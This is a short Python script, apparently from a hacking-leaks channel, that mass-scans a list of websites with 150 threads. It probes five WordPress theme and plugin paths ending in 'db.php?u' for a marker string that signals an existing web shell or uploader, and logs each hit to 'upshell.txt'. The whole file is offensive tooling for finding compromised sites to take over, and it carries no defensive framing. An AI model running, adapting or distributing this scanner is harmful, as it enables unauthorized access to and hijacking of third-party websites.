import sys , requests, re, random, string
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init 
init(autoreset=True)
fr  =   Fore.RED
fg  =   Fore.GREEN

banner = """
  ____ ___  ____  ____    _    ____ ___  ____  ____ 
 / ___/ _ \\|  _ \\| __ )  / \\  |  _ \\_ _|  _ \\/ ___|
| |  | | | | |_) |  _ \\ / _ \\ | | | | || |_) \\___ \\
| |__| |_| |  __/| |_) / ___ \\| |_| | ||  __/ ___) |
 \\____\\___/|_|   |____/_/   \\_\\____/___|_|   |____/  

               Created by @cobraegy
        http://t.me/cobraegyleaks
"""

print(banner)

requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')

def ran(length):
	letters = string.ascii_lowercase
	return ''.join(random.choice(letters) for i in range(length))

Pathlist = ['/wp-content/themes/seotheme/db.php?u','/wp-content/themes/pridmag/db.php?u','/wp-content/plugins/linkpreview/db.php?u','/wp-content/themes/gaukingo/db.php?u','/wp-content/plugins/seoplugins/db.php?u']

class EvaiLCode:
	def __init__(self):

		self.headers = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36'}

	
	def URLdomain(self, site):

		if site.startswith("http://") :
			site = site.replace("http://","")
		elif site.startswith("https://") :
			site = site.replace("https://","")
		else :
			pass
		pattern = re.compile('(.*)/')
		while re.findall(pattern,site):
			sitez = re.findall(pattern,site)
			site = sitez[0]
		return site
		
		
	def checker(self, site):
		try:
			
			url = "http://" + self.URLdomain(site)
			for Path in Pathlist:
				check = requests.get(url + Path, headers=self.headers, verify=False, timeout=25).content
				if("#0x2525" in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('upshell.txt','a').write(url + Path + "\n")
					break
				else:
					print('Target:{} -->! {}[Failid]').format(url, fr)
					
		except:
			pass



	
Control = EvaiLCode()	
def RunUploader(site):
	try:
		Control.checker(site)
	except:
		pass
mp = Pool(150)
mp.map(RunUploader, target)
mp.close()
mp.join()